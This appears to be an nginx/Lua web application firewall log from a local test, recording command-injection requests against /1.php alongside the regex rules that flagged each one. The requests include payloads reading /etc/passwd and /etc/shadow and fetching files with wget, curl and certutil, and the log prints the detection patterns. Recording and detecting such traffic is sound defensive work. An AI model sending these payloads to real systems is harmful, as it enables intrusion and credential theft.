2024/07/08 07:08:41 [warn] 8#8: *1 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET / HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *65 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Duname+-a%0D%0Aid HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *66 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dps%0Dnetstat HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *66 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Logical Operators and Newline Characters => ([|][|]|[&][&]|\n|\r), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dps%0Dnetstat HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *66 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dps%0Dnetstat HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *67 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3D%24%28%60whoami%60%29 HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *67 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3D%24%28%60whoami%60%29 HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *67 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3D%24%28%60whoami%60%29 HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *68 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3D%5Cu0024%7Buname+-a%7D HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *68 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3D%5Cu0024%7Buname+-a%7D HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *68 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3D%5Cu0024%7Buname+-a%7D HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *69 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcat+%2Fetc%2Fpasswd HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *69 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcat+%2Fetc%2Fpasswd HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *69 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcat+%2Fetc%2Fpasswd HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *70 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dwhoami HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *70 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dwhoami HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *70 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dwhoami HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *71 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Duname+-a HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *71 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Duname+-a HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *71 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Duname+-a HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *72 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dnetstat HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *72 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dnetstat HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *72 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dnetstat HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *73 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Difconfig HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *73 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Difconfig HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *73 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Difconfig HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *74 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dwget+http%3A%2F%2Fexample.com HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *74 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dwget+http%3A%2F%2Fexample.com HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *74 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dwget+http%3A%2F%2Fexample.com HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *75 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcurl+http%3A%2F%2Fexample.com HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *75 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcurl+http%3A%2F%2Fexample.com HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *75 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcurl+http%3A%2F%2Fexample.com HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *76 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dchmod+777+%2Ftmp HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *76 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dchmod+777+%2Ftmp HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *76 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dchmod+777+%2Ftmp HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *77 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dchown+root%3Aroot+%2Fetc%2Fpasswd HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *77 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dchown+root%3Aroot+%2Fetc%2Fpasswd HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *77 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dchown+root%3Aroot+%2Fetc%2Fpasswd HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *78 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dfind+%2F+-name+%27passwd%27 HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *78 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dfind+%2F+-name+%27passwd%27 HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *78 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dfind+%2F+-name+%27passwd%27 HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *79 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dgrep+%27root%27+%2Fetc%2Fpasswd HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *79 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dgrep+%27root%27+%2Fetc%2Fpasswd HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *79 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dgrep+%27root%27+%2Fetc%2Fpasswd HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *80 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Decho+%27Hello%2C+World%21%27 HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *80 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Decho+%27Hello%2C+World%21%27 HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *80 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Decho+%27Hello%2C+World%21%27 HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *81 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dkill+-9+1234 HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *81 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dkill+-9+1234 HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *81 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dkill+-9+1234 HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *82 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcat+%2Fetc%2Fshadow HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *82 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcat+%2Fetc%2Fshadow HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *82 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcat+%2Fetc%2Fshadow HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *83 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcat+%2Fetc%2Fhosts HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *83 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcat+%2Fetc%2Fhosts HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *83 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcat+%2Fetc%2Fhosts HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *84 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dtouch+%2Ftmp%2Ftestfile HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *84 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Files => (/etc/passwd|/etc/shadow|/etc/hosts|/var/log/|/tmp/|/home/), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dtouch+%2Ftmp%2Ftestfile HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *84 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dtouch+%2Ftmp%2Ftestfile HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *85 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Ddir HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *85 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Windows Commands and Files => (dir|type|whoami|systeminfo|tasklist|netstat|ipconfig|certutil|powershell|echo|copy|findstr|ping|tracert|nslookup|net|netsh|wmic)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Ddir HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *85 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Ddir HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *86 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dtype+C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *86 [lua] waf.lua:209: attack(): Attack detected: Command Injection - PHP Functions => (exec|system|passthru|shell_exec|proc_open|popen), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dtype+C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *86 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dtype+C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *87 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dwhoami HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *87 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dwhoami HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *87 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dwhoami HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *88 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dsysteminfo HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *88 [lua] waf.lua:209: attack(): Attack detected: Command Injection - PHP Functions => (exec|system|passthru|shell_exec|proc_open|popen), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dsysteminfo HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *88 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dsysteminfo HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *89 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dtasklist HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *89 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Windows Commands and Files => (dir|type|whoami|systeminfo|tasklist|netstat|ipconfig|certutil|powershell|echo|copy|findstr|ping|tracert|nslookup|net|netsh|wmic)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dtasklist HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *89 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dtasklist HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *90 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dnetstat HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *90 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Linux Commands => (cat|whoami|uname|netstat|ifconfig|wget|curl|chmod|chown|find|grep|echo|kill)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dnetstat HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *90 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dnetstat HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *91 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dipconfig HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *91 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Windows Commands and Files => (dir|type|whoami|systeminfo|tasklist|netstat|ipconfig|certutil|powershell|echo|copy|findstr|ping|tracert|nslookup|net|netsh|wmic)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dipconfig HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *91 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dipconfig HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *92 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcertutil+-urlcache+-split+-f+http%3A%2F%2Fexample.com+file.txt HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *92 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Windows Commands and Files => (dir|type|whoami|systeminfo|tasklist|netstat|ipconfig|certutil|powershell|echo|copy|findstr|ping|tracert|nslookup|net|netsh|wmic)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcertutil+-urlcache+-split+-f+http%3A%2F%2Fexample.com+file.txt HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *92 [lua] waf.lua:114: inAttack(): 172.18.0.1 attackCount: 2, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dcertutil+-urlcache+-split+-f+http%3A%2F%2Fexample.com+file.txt HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [warn] 8#8: *93 [lua] cache.lua:56: cacheGet(): failed to get key: block:172.18.0.1 nil, client: 172.18.0.1, server: , request: "GET /1.php?2%3Dpowershell+Get-Process HTTP/1.1", host: "localhost"
2024/07/08 07:15:34 [info] 8#8: *93 [lua] waf.lua:209: attack(): Attack detected: Command Injection - Common Windows Commands and Files => (dir|type|whoami|systeminfo|tasklist|netstat|ipconfig|certutil|powershell|echo|copy|findstr|ping|tracert|nslookup|net|netsh|wmic)[\s\"'`}]?(?!\w), client: 172.18.0.1, server: , request: "GET /1.php?2%3Dpowershell+Get-Process HTTP/1.1", host: "localhost"
